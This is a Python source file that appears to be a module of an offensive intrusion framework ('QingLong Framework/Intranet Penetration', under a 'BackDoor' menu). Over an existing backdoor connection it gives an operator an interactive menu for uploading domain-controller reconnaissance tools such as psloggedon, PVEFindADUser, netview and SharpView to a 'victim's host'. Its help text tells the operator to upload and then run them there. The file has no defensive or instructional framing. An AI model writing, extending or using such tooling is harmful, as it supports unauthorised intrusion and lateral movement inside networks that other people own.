from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory
from AuxiliaryFunctions import MyTable
from AuxiliaryFunctions import uploadCVE


def Locating_Domain_Controllers(conn):
    commands = ["back", "show functions", "upload", "psloggedon.exe", "psloggedon64.exe", "PVEFindADUser.exe", "netview.exe", "SharpView.exe"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Information ~ Locating Domain Controllers] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice == 'show functions':
            show_functions()
            continue
        elif choice == "":
            continue
        elif choice.split()[0] == 'upload':
            uploadCVE.uploadCVE(conn, choice)
            continue
        elif choice == 'back':
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Locating Domain Controllers" + '\033[0m' + "\n" + '=' * len("Locating Domain Controllers") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "psloggedon", "上传psloggedon.exe/psloggedon64.exe到受害者主机上定位域控制器"],
              ["2", "PVEFindADUser", "上传PVEFindADUser.exe到受害者主机上定位域控制器"],
              ["3", "netview", "上传netview.exe到受害者主机上定位域控制器"],
              ["4", "SharpView", "上传SharpView.exe到受害者主机上定位域控制器"]]
    MyTable.createTable(headers, mydata)
    print("\n" + "[step1] upload the tool you want.")
    print("[step2] execute the tool on the victim's host.")
